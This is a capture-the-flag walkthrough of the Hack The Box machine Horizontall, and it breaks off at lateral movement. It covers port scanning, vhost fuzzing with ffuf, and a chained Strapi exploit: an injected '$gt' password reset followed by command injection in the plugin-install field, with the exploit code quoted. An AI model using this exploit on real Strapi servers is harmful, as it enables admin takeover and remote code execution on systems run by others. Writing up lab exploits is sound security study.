# Horizontall Machine (10.10.11.105)

![Screenshot from 2022-02-09 15-51-45](https://user-images.githubusercontent.com/79413473/153178656-e2e02f73-4595-40c5-bec5-9b972891ec0c.png)

## Recon:
+ Port scan:
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```  
+ Add **Horizontall.htb** to hosts file also run some vhost fuzzing on it as there is nothing much on main domain.
```
ffuf -u http://horizontall.htb/ -w ~/wordlist/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" -fc 301
```
+ Found *www* & **api-prod**. Add them to hosts file and api-prod.horizontall.htb gives welcome message
![Screenshot from 2022-02-09 16-13-34](https://user-images.githubusercontent.com/79413473/153182217-2a3b0ec2-ccf7-42e1-8d5a-5afdc407607b.png)

## Foothold: Exploiting strapi CVE
+ Running ffuf we get */admin* which redirect to login panel, looking back in burp you will see a request when accessing */admin* which reveals vulnerable strapi version
![Screenshot from 2022-02-10 19-49-36](https://user-images.githubusercontent.com/79413473/153426416-30960267-7072-4212-9b6a-055d5d534b59.png)
+ Google this strapi *version* number and you will get a [exploitdb](https://www.exploit-db.com/exploits/50239) which have a Unauthenticated RCE by chaining two CVEs. First reset admin password then execute code on machine by installing plugin.
```
 def password_reset():
 41     global url, jwt
 42     session = requests.session()
 43     params = {"code" : {"$gt":0},
 44             "password" : "SuperStrongPassword1",
 45             "passwordConfirmation" : "SuperStrongPassword1"
 46             }
 47     output = session.post(f"{url}/admin/auth/reset-password", json = params).text
 48     response = json.loads(output)
 49     jwt = response["jwt"]
 50     username = response["user"]["username"]
 51     email = response["user"]["email"]
```
Anyone can change admin' s password tehn it loads admin's jwt in response and use that further you can also login by **admin:SuperStrongPassword1**

```
 def code_exec(cmd):
 59     global jwt, url
 60     print("[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don't expect to see output")
 61     headers = {"Authorization" : f"Bearer {jwt}"}
 62     data = {"plugin" : f"documentation && $({cmd})",
 63             "port" : "1337"}
 64     out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
 65     print(out.text)
```
This part here send a post request to */plugin/install* with our payload in plugin field port number doesn't matter somehow here, you can even remove that field.You will have a blind RCE. Let's get a shell from here as **strapi** user

## Lateral Movement:
+ There is a developer user on machine, 
